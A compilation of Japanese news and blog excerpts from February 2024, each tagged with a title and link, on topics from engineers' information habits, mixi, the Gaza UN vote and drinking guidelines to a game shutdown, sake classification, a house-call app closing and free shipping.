特に、専門的な知識がないと追うのが難しい時や、複数の分野を横断した知識が求められる時は、途中で力尽きてしまうこともあります。でもやりきらなければ、中途半端な知識しか得られません。

そういうときは、諦めてしまわないように、自分にまじないをかけるんです。例えば僕は、会社全体のフロントエンドの啓蒙活動などを行う「フロントエンドエキスパート」という肩書を持っています。なので「エキスパートであるからには徹底的に調べ切らんといかんだろ….！」と自分に言い聞かせる。根性論っぽい話ですが、これが結構効くんですよね。新卒入社したばかりの頃も「新卒なのだから、深く調べる癖をつけるためにも調べ切ろう」などと自分を鼓舞していました。ほかにも、自分の専門領域以外の情報を集めないといけない時は「フロントエンドエンジニアである以前にエンジニアなんだから」と自分に言い聞かせ、やりきるようにしてます。

情報収集において最もしんどくて、最も重要なことは「習慣化」と「追い切る」の2つだと思います。この2つを着実に積み重ねるために、これらに伴う「しんどい」をハックする方法を色々試して、今のやり方にたどり着きました。知的好奇心を満たす楽しみを味わいながら、エンジニアとして成長するために、今後もその時々の自分にとってベストな方法を探しながら情報収集を続けていこうと思っています。

取材・構成：光松瞳

編集：王雨舟
Title: 継続のコツは「わざわざ見に行く」をなくすこと。はてなフロントエンドエキスパートmizdraの情報収集術

Link: https://www.itmedia.co.jp/news/articles/2402/19/news092.html
Content: 先週のアクセストップはこの連載（ITmedia NEWS Weekly AccessTop10）の記事だった。15年ほど前までNHKテレビで時報を伝えていたアナログ時計「NHK時計」のスマートフォンアプリが、若年層から「（機能が少なすぎて）ひどすぎる」と評価され、アナログテレビ時代を知る人から驚かれているという話題だ。まさにジェネレーションギャップを感じさせられた。

ジェネレーションギャップといえば、最近筆者は、往年のSNS「mixi」を本格的に再開している。現在の40代前後が、10〜20年前にドはまりしたSNSだ（筆者は45歳）。

mixiのスタートは2004年。“Web2.0”としては先進的なサービスだった。当時最先端だったサービスを20年後にやってみたら、意外な感情がわき起こってきた。

mixiのプロフィール画面

日記のタイトル付けが面倒、「足あと」は重い

現在のmixiのメイン機能は、Xのような短文の「つぶやき」だ。「日記」や「mixiニュース」「コミュニティ」なども現役で、ユーザーインタフェースは10年前とあまり変わっていない。久しぶりに使うとメニューが多すぎて、どこから投稿すればいいのか分からないし、「つぶやき」と「日記」の使い分けもよく分からなくて困惑する。

mixi日記の例

mixi草創期からのメイン機能は「日記」なので、筆者も日記を書いてみることにした。

日記は本文の前に「タイトル」が必須なのだが、XやFacebookで本文だけ書くことに慣れすぎて、タイトルを書くのがつらい。タイトルを思い付かなくなっているのだ。筆者のマイミクには、日記を書き続けている人もいるが、毎日同じタイトルにしている人が多い。

日記は投稿まで3クリック以上かかるのもきつい。「日記」を選んでクリック、書き終わってクリック、その内容を確認してまたクリック……。しかも各ステップで微妙に待ち時間があり、LINEやXのようなリアルタイム感は皆無だ。

日記に添付できる写真は3枚まで。執筆中は、「photo src=」といった画像タグが入るだけで、写真のプレビューは表示されない。さらに、写真の容量は全日記合計で200MBという、今時シビアすぎる制限まであった。

mixi日記の投稿画面

「足あと」機能にも複雑な感情を覚えた。友人のページを見に行くと、自分の「足あと」が自動でついて訪問を知らせる機能はねっとりと重い。足あとを付けてもいいねやコメントをしないと“既読スルー”っぽくて、ちょっと心がザワザワする。

何も起きない、それがいい

不満ばかり吐き出してしまったが、それでもmixiの空気感は「いいな」と思った。時間の流れがゆったりしているからだ。

mixi日記を書こうとすると、Xの投稿より時間がかかる。タイトルを考えなくてはならないし、クリックの数も多い。さらに、更新している人が少ないため、タイムラインがほぼ動かない。ゆったりとタイトルを考え、本文を書き、更新する。そして、何も起きない。そこがいい。

筆者はここ10年で、XやInstagramなど、秒単位で動き続けるタイムラインに慣れてしまった。ただ、めまぐるしく変わるタイムラインはせわしなく、自分のペースを忘れてしまう。更新を追って端末にくぎ付けになってしまうし、アルゴリズムによるおすすめから不愉快な内容や腹立たしいコンテンツに遭遇してイライラすることも多い。

その点、mixiは無風に近い。自分のペースで更新できるし、感情を不意に揺り動かされる機会が少ない。タイムラインに張り付いても何も起きないので、画面から離れて別のことをやろう、という気持ちにもなりやすい。1日待てば足あとやコメントが付くこともあり、ゆったりとつながることができる。

あのころのインターネットは、こんなにゆっくりしていたのか。今あえてmixiをやってみて、時間の流れ方の違いに驚き、せわしない日常から少し距離を置けた気がした。
Title: 今あえて「mixi」をやってみて気づいた、あのころの良さ

Link: https://www.cnn.co.jp/usa/35215427.html
Content: （ＣＮＮ） 米国のトーマスグリーンフィールド国連大使は、もしアルジェリアがパレスチナ自治区ガザ地区の人道的停戦を求める決議案を国連安全保障理事会に提出した場合、拒否権を行使する構えを示した。

トーマスグリーンフィールド大使は１７日に発表した声明の中で、イスラエルとハマスの間で人質を解放して少なくとも６週間、戦闘を休止する取引について交渉が進められていると強調した。

「この１週間、バイデン大統領はネタニヤフ首相やエジプトおよびカタールの首脳と何度も電話会談を行い、この交渉の進展を促した。まだ隔たりは残っているが、鍵となる要素は提示された」とトーマスグリーンフィールド大使は述べている。

その上で、人質を解放させ、長期間の戦闘休止を実現してパレスチナの民間人に支援物資を届けるためにはこの取引が最善だと強調。「対照的に、安保理提出の決議案ではそうした目標を達成できず、実際にはその逆になる可能性もある。従って、米国はこの決議案を支持しない。決議案の採決が行われても、採択されない」とした。

アルジェリアの決議案はガザの即時停戦と妨げのない人道支援を求める内容で、アラブ諸国が７日に支持を表明していた。

他の加盟国とともに記者会見したパレスチナのマンスール国連大使は国連に行動を促し、同決議案の「圧倒的」支持を確信していると語った。
Title: ガザ人道停戦決議案、米は拒否権行使の構え　国連安保理

Link: https://www.sankei.com/article/20240219-MC3E5KP43BKBRP7Z6RYAHLJDOM/
Content: 厚生労働省は１９日、飲酒のリスクや体への影響をまとめた初のガイドラインを発表した。年齢や性別、体質、疾病別で異なる飲酒による健康リスクを示したほか、酒量より「純アルコール」の摂取量に着目することが重要としている。

指針によると、大腸がんの発症リスクを高める飲酒量の目安は、１日当たりビールロング缶１本に相当する約２０グラム（週１５０グラム）以上などと例示。特に高齢者は体内の水分量の減少などで酔いやすく、飲酒量が一定量を超えると認知症が発症する可能性が高まる。

また、１０～２０代は脳の発達段階にあり、多量の飲酒で脳機能が低下するとのデータがあり、高血圧などのリスクが高まる可能性もある。女性は男性よりもアルコールの影響を受けやすく、少量でも肝硬変のリスクが高まるという。

指針では、健康リスクを減らすために、酒に含まれる「純アルコール量」を用いた健康管理を勧めている。純アルコール量は、アルコール度数と飲酒量、アルコール比重０・８の３つを掛けることで計算できる。

健康増進に向けて国が定めた基本計画では、生活習慣病のリスクを高める１日当たりの純アルコール量について、男性は４０グラム以上、女性は２０グラム以上と示している。２０グラムはビール１本（５００ミリリットル）、日本酒１合（１８０ミリリットル）に相当する。

夜食は万病のもと 10時間の空腹が疾病リスク下げる

がん電話相談 大腸切除後、抗がん剤治療で副作用

お酒が増えると がんになりやすく
Title: ビールロング缶１本以上で大腸がんリスク　厚労省が初の飲酒ガイドライン

Link: https://note.com/cokota/n/n1c285547dbde
Content: そしてオフラインアプリになります



このnoteをご覧のみなさん（の大多数）には何を今更の話ですが、有川がシナリオの総監修とメインストーリー執筆を担当していたスマホゲーム『ワールドフリッパー』が2024年2月20日に4年超に渡ったサービスを終了します。

それと同時に、この日から『ワールドフリッパー』はメインストーリーとイベントストーリー、そしておよそ1200話にも及ぶキャラエピソードと各種ボイス・BGMを楽しめるオフラインアプリとしてアップデートされる事が決まっています。

1200話超というのが既にちょっと常軌を逸している気もしますが、輪をかけて逸しているのは、その全てが映像作品として手抜き無しで作られている事でしょう。

そう、全部。全部なのです。全部の話が全部、キャラクターが動き、アクションし、書下ろしの背景の中で飛んだり跳ねたり爆発したりします。★5に至っては書きおろしの専用BGMまでついている（おかしい）（★5の方が多いのに）。

実際どんなものなのさ？というのは、以下の動画で一目瞭然です。

https://twitter.com/errorworld/status/1708702211944153422

こういった映像が各キャラクターのエピソードとしてあり、それが1200超あります。てか1200超て。何度も書いてるとちょっと笑えてきますね。よくもまあそんなに……。

（ちなみにメインストーリーはこうした映像演出やカメラワークから殺陣の設計、キャラの細かい演技なんかも有川が設計していたので、演出家としての仕事もみていただけたら嬉しいな～と思っています。演出もできる脚本家。御用はありませんか。今、絶賛無職中です）

ノンストップなアクションバトルである事とか、奥深く多様なデッキ編成が可能なゲーム性に比べてあまりアピールされなかった部分ではありますが、正直これだけの『質量』をもったアプリは、なかなか無いのではないかなと思います。というか、割と前代未聞なのではないかと……。いや、分からんけども。あるかるかもしれんけども。だけど非常にとても稀でヤバイ事は間違いない筈……！

そして声を大にして言いたいのは、その1200超のエピソード『全てが』高い品質を保っているという事です。マジの、マジモンの、どこに出しても恥ずかしくない全力投球のドラマが、全てのエピソードに投入されています。果たしてこれが大言壮語なのかどうか、是非ご確認ください（いうて映像の暴力だけでも勝てるやろ……！という勝算があるのででかい口が叩けています）。

そんなスーパー質量コンテンツ、オフライン版ワールドフリッパーを是非よろしくお願いします。2月20日。アップデートです……！

※とはいえとはいえ、RPG的なバトル攻略をしながらの物語体験は本当にこの今だけの体験となります。『AIが人類に成り代わった世界で最後の人類を主人公達が殺すシーン』とかはバトルならではの体験ですので、後三日ですが、駆け抜けていく事もできなくはありません。時間のあるあなた！有川の知人友人のそこの君！是非！是非ね？是が非でもね？どうかお楽しみを！！

ながい時を振り返って

そして本来ならば記事の頭で書くべき事でしたが――おそらくは本作を愛してくださったみなさま。本当に、4年間のご愛顧をありがとうございました。本作を代表する立場ではまったく完全にありませんが、シナリオ制作に携わった一個人として、心よりお礼申し上げます。

ちなみにワールドフリッパーのメインライターなる人物の振り返りは、ゲーム情報メディアであるINSIDEさんがすてきな記事として世に送り出しております。もうそこに全て詰まってるので。是非！

ですので、ここからは個別の仕事の話ではなく、有川がシナリオライターとして歩みはじめたこの10年ほどを振り返る、単なる自分語りをはじめます。しみったれた、しょーもないオレオレ話が好きな方、ガッカリしない方、ご留意の上お付き合いください。

大丈夫ですか。

大丈夫ですね。

えー。それではまあ、昔話などを一つ。

思い返せば、およそ10年前。『ジュエルセイバー』というゲームを作ったのが、全ての始まりでした。

時はソシャゲバブルと呼ばれる時期（――が微妙に終わって、ガラケー界隈はもうなんか色々レッドオーシャン味が激増してた時期）の事です。「コンシューマーゲーム業界で挫折した自分でも、テンプレのソシャゲなら作れる気がしますので、やっちゃいません？」と当時の所属会社に、舐めた提案した男が居ました。男は更に舐めた見積もりで「キャラの掛け合いぐらいなら俺でも書けるんじゃね？」とシナリオ制作経験が皆無だったのに舐めプの限りを尽くしました。試しに夜中に書いた二人の少女の掛け合いが、わりとなんか可愛い感じで書けてしまって、いい気になっちゃったんですよね。

結果を言えば、ジュエルセイバーは商業的には芳しくない結果を残したプロダクトでした。『コンテンツフリー化（イラストテキストを無料で自由に商業利用してもエエよ）』という奇策を打ち出した事で、辛うじて世に爪痕を残せた作品だと言えるでしょう。

※ただしカードイラストのクオリティは高品質でした。フリーコンテンツ化が成功したのも兎にも角にもイラストがよかったお陰です。

ですので、制作者としては悔いの多い作品だったのです。正直、至らず足りぬ事ばかりだったなと。ただ、それでも今も尚、twitterで検索すれば作品の思い出を語ってくれるユーザーさんがいる作品であり、自分自身にも『まだ描きたいもの、語りたいものがある』と気づかせてくれた、原点ともいえる作品でした。舐めプではじめたライター業を、その後の人生を賭するものにしようと決断させるに至った作品だったのです。私をライターにしてくれたのは、当時のファンの皆様だったと、真剣に思っています。

さて、そんなジュエルセイバーもサービスを終了し、フリーコンテンツ化施策が進んでいた頃。仕事中もほぼ上の空だった自分の頭の中を占めていたのは『では、自分はなにを描くべきなのだろう？』という事でした。

まずジュエルセイバーでやり残した事、描き切れなかった事があります。ですが、どうしてかそれと連鎖し共鳴するように、数年前に世を賑わせた犯罪者についてのルポだとか、社会的弱者と強者の定義論だとか、或いは自殺してしまった父の親友（自分にとってはギャンブルやくだらない遊びを大いに教えてくれた、大好きだったKさん）の事をしばしば考えるようになっていました。つまり『思想性』をグツグツ煮詰めていたのです。

物語と思想性

思想性。ちょっと大仰な言葉ですが、右派や左派といった既に類型化されたイデオロギー的なものとはちょっと違うものと思ってください。

※特に党派を問うような話は『所属』や『ポジショニング』の話なのでここではあまり重要ではありません。

例を出すのならば『死生観』などでしょうか。或いはもっとミロクな……なにに怒り、なにに悲しみ、なにで笑うのか？世界をどのように視るのか？どのような質感を感じ取っているのか？どんなものを自らの財宝と見做すのか？といったような『個人の内に在る世界観』とも言い換えられる言葉と考えてください。



異論も異例もあるでしょうが、私はこの『思想性』をシナリオライティングにおける非常に重要な要素だと考えています。これはなにも高尚で教育的な作品に限るものではなく、エンターテイメントの中核を成すものと考えており、例えば鳥山明先生の『ドラゴンボール』などはある種の思想性が堅持された作品の好例としてよく話をしていました。他にも例を挙げるのならば、手塚治虫、藤田和日郎、宮崎駿、富野由悠季、庵野秀明――偉大なる作家達は誰かの財産となり得る思想を描きます。

※悟空がフリーザを殺した時の無言の表情とその構図。そして魔人ブウにまたな！と言って再会を願った時の表情とその構図。その意図的すぎる対比から浮かび上がるものは……！みたいな話を書き始めると1万文字ぐらいになるのでここでは我慢します。読もう！ドラゴンボール！！

※ですから、自分が率いるチームには各人の思想性を克明にするために徹底的な言語化を求めました。「この物語と、あなたの内にある思想が知りたい」「なぜ、このキャラクターはそうしたのか。そうせざるを得なかったのか？その理由が知りたい」といった厄介な質問を浴びせる事を日常としていたものです（こんな厄介な人間とよく付き合ってくれたと思います。みんなありがとう……）。ちなみに思想の言語化というのは別にライターにとっての必須スキルでもなんでもないのですが、思想性の濃い物語を『複数の人間で共有して作る』にはちょっと避けては通れないものではあります。



ただ一方で、こうした思想性の強さはプロダクトの仇になる場合もあるでしょう。思想性が硬直化した脚本は息苦しいものですし、攻撃的な（他責的な）面を帯びた物はしばしば『説教臭い』と称されます。それと、発注側の立場を考えば『要件に従わない、扱い辛い取引相手』と思われてしまう危険性もありそうです。

幸か不幸か、自分の場合は『コンセプトを考えるのは自分。要件を作るのも自分。書いて作って検品ＯＫするのも、自分』という状況がキャリアのほとんどでした。お陰で発注者と揉める系の問題からは遠ざけられていたのですが、逆にいえば一人で煮詰めた過ぎた思想性が前述したような問題を起こす危険は高かったのです（正直に言えば、これは今もまだ抱えてる不安の一つです）。

それからどんとこしょ

では、その結果は、どうだったのか。思想性を打ち出していくぞと心に決めて、シナリオライターの世界に踏み込んでいった結果は、どうなったのか。

大雑把に見た感触を言えば、私は大きな大きな励ましと手ごたえを感じる毎日を過ごせました。私の元に届く声援は、本当に、予想以上というか、予想外というべきものだったのです（だって私の領分は、本当は『オマケ』と見做された部分だったわけですから）。

ただ、これは『正しかった』という話では断じてないですし『通じたのだ』と思うのも若干おこがましい程度の感触です（思想を込める事、意図を設計する事は物語を豊かにしますが、物語はそうした作者の意図を超えて自由に受容されるのが常だからです）。ですから、いうなればこれは『どうやら、最後まで話を聞いてもらえたようである』というぐらいが、ちょうどいい感じかもしれません。

長い長い話に、付き合ってもらえた。自分の見つけたものを、一緒にみてもらえた。――そんな事は、実は人生においても稀な事なのです。

たとえ、見ているものが真には違ったとしても。



だからここで伝えたいのは、ただただ感謝です。本当に、ありがとうございました。最後の最後までお付き合いいただいた事を、嬉しく思います。

もし、また私の話にお付き合いいただけるのならば……オフライン版のワールドフリッパーを是非よろしくお願いします！沢山詰め込まれておりますので、初めての方は勿論、これまで読んでいただいた方も是非！二度三度読み直すのも乙なものです。どうかお楽しみください。きっと後悔はさせませんので！

もうひとつ謝辞を

ここからは更に個人的な話を。

思想性マシマシでライターやってました！という話をここまで書きましたが、この数年で最も嬉しかったのは『違う思想性の人と、協同できた』という事でした。かつては、チームで物語を作るという事に打ちのめされ「もういい……もういいんだ。最早命を賭し、自分だけでやるしかないんだ…………」などと腐った魚の眼と偏狭な心で『違うもの』を拒否していた日々もありましたが、激動の日々で出会ったライター達は『違う事が楽しい』『その違いに感化されてしまうのも楽しい』とすら思える人々でした。先に書いたように、煮詰まった思想性が硬直したり攻撃的になったりする罠を、もし私が回避できていたとするのならば、それは間違いなくこの素晴らしいライター達と出会えたがためです。

また一緒に、仕事しましょう！（仕事あったら、回してね！）
Title: ワールドフリッパーがサービスを終えます｜有川光太

Link: https://shouyutechou.hatenablog.com/entry/2024/02/18/161237
Content: 前回の記事は、思っていた以上の皆様に読んでいただけたようです。ありがとうございます！

shouyutechou.hatenablog.com

というわけで、第二回をやっていきます。

第二回の元記事はこちらですね。

toyokeizai.net

ここもまあ、あれでして。

元記事が短いのでそんなに多くはないのですが、例によって例のごとくツッコミを入れていきます。

日本人が知らない｢激安お酒｣のヤバすぎる裏側、を問題視する

2ページ目のツッコミどころ

じっくり時間をかけて発酵させることで甘味、酸味、辛味など、日本酒の複雑で深い味わいが醸成されます。

うーん、何といいましょうか。厳密では間違いではないかもしれないんですが、正確ではないということで一応。

それは日本酒に「辛味」があるか、ということです。

辛口の日本酒、なんて表現があるのですが、日本酒には唐辛子などを入れているわけではありません。現在主に使われているような辞書的な意味での「辛味」は存在しないんですよ。（ものすごく厳密にいうと「辛み」であり、味の字はあとから当て字として混ざったとかそういう話もあったりするんですがそれは割愛します）

辛味は味覚ではなくて、舌などに刺激がある痛覚に近いものだ、という話はよく知られていると思います。いわゆる辛味成分（唐辛子のカプサイシンなど）が、そういった刺激物質です。

そして日本酒にはこういう辛味成分が含まれていないんです。発酵によっても生み出されません。

じゃあ日本酒の辛口というのは何なのかというと、これがまた大変長いお話になるので、おおざっぱに言いますと「甘くない日本酒」や「後味にキレがある日本酒」を「辛口」と呼ぶことが多いと考えればいいでしょう。

まあ、自分にとってはアルコールの刺激が大変きつくて辛味と感じるんだと強弁されれば、まあ個人の感じ方だしそれはそうなのかも……とはなりますが、辛味が発酵で醸成されることはないんです。

アル添と呼ぶことは呼びますが、「普通酒」や「一般清酒」とは呼びません。ここは明確に間違えているポイントです。

このあとの第三回で著者自身も少し触れていますが、日本酒はものすごく大きくカテゴライズをすると「普通酒」と「特定名称酒」に分けることができます。

特定名称酒というのは「定められた基準を満たしている材料や製法で造られているお酒」です。ようするに、材料も吟味していますし、製法も特別なものだったり手間暇かかっているんですよ、というお酒ですね。ちなみに、著者が同じページで挙げている「純米酒」も「特定名称酒」です。きちんと規格が定められているものなのです。

逆に言いますと、特定名称酒のような特別な手間暇をかけたお酒以外は普通酒なんです。少し乱暴ではありますが、普通酒には明確な法律上の基準があるわけではなく、特定名称酒以外はすべて普通酒と考えればいいでしょう。「普通酒」という言葉も通称ですし、「一般酒」「一般清酒」と言われることもあります。

つまり、純米の中にも普通酒はたくさんあるんです。いわゆる地酒を扱っている酒屋さんではなくてスーパーなどに行ってみると、「米だけの酒」に二種類あることに気づくと思います。「米だけの酒 純米酒」と「米だけの酒（純米酒の規格に該当しません）」です。後者は普通酒なんですね。

お米だけを使っているのに純米酒の規格に合わないというのはどういうことなのかと疑問に思われる方もいると思います。たとえば純米酒だけでなく、特定名称酒にするためなら、使うお米を農産物検査で3等以上に格付けされたものを使わなければなりません。

逆に言うと、その規格から外れてしまったもの（これを等外米と言います）を使うと、純米酒と名乗れないのです。また、麹の使用割合が低い（15％未満）ものも普通酒となります。お米か麹のどちらかで、規格に該当していないのでしょう。

該当しているのに「米だけの酒 純米酒」と言っているのはなぜなのかというと、実は純米酒の規格は昔はもっと厳しかったのが、2004年に緩和されたことに要因があります。緩和前は規格を満たせなかったので「米だけの酒」としていて、緩和後は規格を満たせるようになった。でも、消費者に馴染みのある名前を残そうということで「米だけの酒」を前に出しているお酒もある、というわけです。

そういうわけで、アルコールを添加しているかしていないかは、普通酒にはまっったく関係ありません。

今、日本酒で最も多く出回っているのが、この「アル添酒」です。みなさんもご自宅にある酒のラベルを見てみてください。

ここはすごく微妙な話ではあります。

まず、普通酒の方が圧倒的に出回っているのは間違いありません。普通酒7割、特定名称酒3割ぐらいです。近年では徐々に普通酒の売り上げが減っているので、特定名称酒の割合が増えてきているけれども、大まかにいうとこのぐらいです。

そして普通酒の中ではアル添のお酒はとても多いです。正確な割合は知らないのですが、アル添の方が多いのは間違いありません。なので、もっとも多く出回っているのがアル添酒という言説は間違いではないのです。

じゃあなぜ微妙かと言いますと。

特定名称酒の中では、純米がどんどん売上を伸ばしていっているからなんですね。

人気の出ているお酒には純米酒が多い、ということから「出回っているお酒でアル添が多い」という言説に、ちょっとした違和感を持つ人もいるかもしれないと思ってのツッコミでした。まあ、ここは元記事が間違っているというわけではありません。

3〜4ページ目のツッコミどころ

さて。問題の箇所です。本題でもあります。

ここが「知識が古い」というところです。

3倍増、まあいわゆる「三倍増醸酒」、略して「三増酒」なんですが、現在は存在しません。

2006年の酒税法の改定によって、造ることが根本的にできなくなったんです。副原料の使用は白米重量の50％以下までとされたので、3倍に増えるぐらいの醸造アルコール（副原料）を加えられなくなったんですね。

というわけで2006年以降は三倍増醸酒を造ると、「清酒（日本酒）」としては認められず「リキュール（※）」扱いとなっております。できて二倍ぐらいまででしょうか。それでもギリギリまで醸造アルコールを入れているところはほとんどなかったりします。

（※）最初「リキュール類」と書いちゃっていました。ご指摘があったのですが、現在は「リキュール」ですので訂正しておきます。申し訳ありません。こういうことを言っておきながらミスが出る一番恥ずかしいパターン！

3倍増というのは、戦後間もないころから生産されるようになった「三倍増醸酒」のことが念頭にあったのだとは思いますが、少なくとも2006年よりも前の知識でしか語っておられないんですね。

著者の方は1951年生まれということで、おそらく2006年には食品専門商社でのお仕事を辞められていたのでしょう。そこからまったく知識がアップデートされていないまま語っているというわけです。さすがに法律の話ですし、今から17年以上前の話ですし、知らないで講演活動とかやっちゃうとまずいですヨ！ こっそり勉強しときまショ！

醸造アルコールは使い方次第というのは本当です。

ただ、それこそ三増酒も一概には悪者にはできないんですね。

以下は最後のツッコミというか単なる歴史の話だし、蛇足だしで興味のない人はスルーしてください。

終戦直後の食糧難のときに三増酒が造られたという話は多くの人が知っていると思いますが、そこには国の思惑も入っていたりするのです。

戦後は何が難しかったというと、原材料であるお米がなかったし、さらに杜氏や蔵人が戦争にかり出されて戦死した方も多かったため、根本的に人手が足りなかったのです。そんな状態でお酒を造れるわけがありません。

そこに、戦争に出ていた兵士が復員してきました。まあ、兵士の大半はお酒を飲める年齢の男性でありますので、お酒の需要が一気に高まります。需要が増えても供給ができない。だとすると、闇市しかありません。

かくして闇市で密造酒が横行するようになりました。いわゆる「メチル」「カストリ（粕取り焼酎とは異なるものです）」「バクダン」です。これらは飲めたものではないというか、失明の危険性があったり死亡率が高かったりするんですが、それでもお酒を欲する人が多かった時代でした。

さらに政府にとって、酒税は主要な収入源だったというのもあります。多いときは税収の三分の一が酒税だったぐらいですから、国民の健康を損ねる上に税収が減る密造酒の横行はたまったものじゃありません。

というわけでお酒を増産しろと言うものの、経験者がのきなみ死んでいたりするわけですから酒造りもうまくいかないわけです。腐造が相次いだりもしてしまいます。そこで国がなんとかしようと考えて、三増酒の技術を開発。添加用の醸造アルコールを大量に配給して各地で三増酒を造らせたのです。そうして密造酒を排除して、税収を蘇らせようとしたのですね。

そして、造り手側にもメリットがないわけではありませんでした。カサ増ししてお金儲けができるというわけじゃなく、途絶えてしまった酒造りの技術の復活です。

もろみの中にたくさんの醸造アルコールが入るということは、確かに味が薄まるということでもあります。ということは逆に、多少お酒造りに失敗しても誤魔化せるということでもあるのです。

そうしてお酒造りに関する経験をのびのびたくさん積むことができたことが、現在の日本酒造りにもつながる技術力の復権にもつながったとも言えるのですね。（もちろんこれだけが全てではありません。念のため）

飲み手側としては……やはり、失明しない。飲んだだけでは死なないというのがメリットでしょう。いやほんと、そういう時代だったというわけです。なので、三増酒は確かによろしくないものではあるんですが、時代背景的には100％悪者じゃないんですよ、という話でした。

ちなみに現在の形での純米酒を最初に造ったのは、京都の玉乃光酒造だと言われています。1964年（昭和39年）に「無添加清酒」を販売開始したのですね。もちろん、純米酒と呼ばれるのにふさわしいお酒は戦前にも造られていたとは思いますが、戦争でいったん全てが途切れて、また純米酒が復活するまでにこれだけの時間がかかったというわけです。

続きは第三回の分へ。
Title: 「日本人が知らない｢激安お酒｣のヤバすぎる裏側」を話す前に知識をアップデートした方がいい - 醤油手帖

Link: https://withnews.jp/article/f0240219001qq000000000000000W0bx10201qq000026648A
Content: 人気の往診サービスが終了

「最短30分で自宅に医師を呼ぶことができる」「健康保険が適用可能」とうたう夜間・休日の往診アプリ「みてねコールドクター」が、2月16日、往診サービスの終了を発表した。約400名の医師が在籍し、アプリから医師の往診を依頼でき、その場で薬を渡すことができるなどとしていた。 株式会社コールドクターが2018年から運営を開始し、2022年には株式会社ミクシィと資本提携。ミクシィ社が運営するダウンロード数1000万人（当時）の子どもの写真・動画共有アプリ「家族アルバム みてね」と連携を強化し、サービス名を「みてねコールドクター」に変更していた。 コールドクター社は往診サービスの終了理由について「今後の往診に関する診療報酬改定に伴う市場の変化を見据え、 『みてねコールドクター』の往診を終了することを決定いたしました」と説明。 往診サービスの利用は2024年3月31日20時59分までは受け付け、「オンライン診療、医療相談につきましては、引き続き全国エリアにおいて24時間365日対応でサービス提供を継続」とした。 では、往診サービスの提供終了につながった「診療報酬改定」の内容とはどのようなものだったのか。

「診療報酬の改定」の内容は

2年に1度、見直され、医療機関の収入を左右する診療報酬。その改定案が、2月14日の厚生労働省の中央社会保険医療協議会総会で了承された。



幅広い医療従事者の賃上げに充てるため、初・再診料や入院基本料などの基本的な報酬を引き上げられたことが注目された。マイナンバーカードを健康保険証としても利用する「マイナ保険証」を後押しする報酬などが新設されたほか、患者にも負担を求める形だった。



その中で、往診に関する診療料にも変化があった。「普段から訪問診療を受けていない患者等」、つまり前述の往診サービスの利用者層の緊急往診や夜間等の往診は厳格化され、低い設定になった。



東京都で訪問診療を主とする「おうちの診療所」を運営する石井洋介医師は、今回の診療報酬の改訂内容について「保険診療で後押しするべきは、具合が悪くなったときにだけ駆けつける医師ではなく、日常を守るかかりつけ医、というメッセージだと感じた」と話す。



「緊急往診や夜間等の往診の診療報酬を手厚くすることで、不必要な救急搬送を減らし、医療現場の負担が軽くなることが期待されていましたが、実際には救急搬送は減らず、ほとんどが小児科領域の往診だったというデータもあります。コロナ禍という特殊な環境下では助かった人も多いと思いますが、以後も保険診療で行う意義は以前から議論されてきました。



本来、医療制度の設計で問われるべきは、いかに地域の医療の負担を減らすかということ。どれだけ往診をこなせるかではなく、予防的アプローチや情報共有など日中にできることをかかりつけ医が徹底することで、往診の負担を減らす方向性が望ましいと感じます」



アプリで気軽に依頼するような往診サービスの運営は今後、厳しくなる見通し。「みてねコールドクター」の迅速な意思決定には医療者らから「利益優先」などの批判も起きた。今後、同様のサービスを運営する事業者の動向にも注目が集まる。
Title: 人気の〝往診サービス〟が突然の終了、理由は「診療報酬改定」なぜ？

Link: https://www.nikkei.com/article/DGXZQODK120KW0S4A210C2000000/
Content: 企業での記事共有や会議資料への転載・複製、注文印刷などをご希望の方は、リンク先をご覧ください。

「理系か文系かを、そもそも分けること自体がおかしい」。こう語るのは生物学者で起業家でもある高橋祥子氏だ。政府の教育未来創造会議やこども未来戦略会議の有識者メンバーを務め、ことあるごとに「文理分け」はイノベーションを求める今の社会になじまないと「不要論」を唱えてきた。

11年前、東京大学大学院時代に遺伝子解析サービス会社を立ち上げた。以降、初対面の人と名刺交換する際に「謝罪」されることがままあると...
Title: 「理系か文系か」やめませんか　革新阻む前世紀の遺物 - 日本経済新聞

Link: https://president.jp/articles/-/78643
Content: ｢アマゾンへの対抗ではない｣から続いている…ヨドバシカメラが100円の電球を送料無料で即日配達する理由 だから｢自社社員による配送｣にもこだわる

ヨドバシカメラのECサイトは100円以下の電球やボールペンなども送料無料で配達している。なぜヨドバシは送料無料を続けられるのか。物流コンサルタントの角井亮一さんは「ほとんどのサービスは、アマゾンへの対抗意識から実施したので、続かなかった。一方、同社の場合、送料無料の即日配達を続ける根拠が明確にある」という――。

※本稿は、角井亮一『最先端の物流戦略』（PHPビジネス新書）の一部を再編集したものです。

物流崩壊で見直しが進む「送料無料」

ECにおける「送料無料」のビジネスモデルが崩れつつあります。

いまや企業も消費者も「サステナブル（持続可能性）」を考慮しなければならない時代。物流の世界――ECにおける買い物も例外ではないのです。

そうした流れの中、政府主催の「我が国の物流の革新に関する関係閣僚会議」では、「物流革新に向けた政策パッケージ」にて、以下の取り決めがなされました。

運賃・料金が消費者向けの送料に適正に転嫁・反映されるべきという観点から、「送料無料」表示の見直しに取り組む。

しかし、サステナブルと「送料無料」表示の見直しが、どう関係するのでしょうか？

実は、送料無料表示が次のように連鎖して物流崩壊を引き起こす可能性が指摘されています。

送料無料となれば、消費者は配送に関わる人たちへの負荷を考慮せず、気軽に再配達を依頼する。そうした負担が配達業者に蓄積されて物流業界が疲弊し、最終的にはECのみならず、あらゆる業界の持続可能性にも悪影響を与える――。

一定額以上の購入であれば「送料無料」と謳っていた企業も、「送料当社負担」「送料割引」といった表記に改める動きが出てきています。

頑なに「送料無料」を謡い続けるヨドバシカメラ

とはいえ、送料無料はネット通販を利用する消費者にとって「魔法の言葉」。その表示の有無によって、購買の明暗が分かれるところです。これまで「送料無料」を武器に儲けてきた企業にとってはジレンマでしょう。

そうした流れに負けず、「日本全国送料無料」の看板を掲げ続けるのが、家電量販大手、ヨドバシカメラが運営する「ヨドバシ・ドット・コム」の「ヨドバシエクストリームサービス便（以下、エクストリーム便）」です。自社による配送を中心に、自らのコストで顧客に商品を届けています。

このヨドバシ・ドット・コムの強みは「送料無料」だけではありません。最短、即日数時間以内という、そのスピードです。

こうしたビジネスモデルを可能にしている、「ヨドバシ・ドット・コム」の強みとは、いったい何なのでしょうか？
Title: ｢アマゾンへの対抗ではない｣から続いている…ヨドバシカメラが100円の電球を送料無料で即日配達する理由 だから｢自社社員による配送｣にもこだわる

Link: https://anond.hatelabo.jp/20240219083952
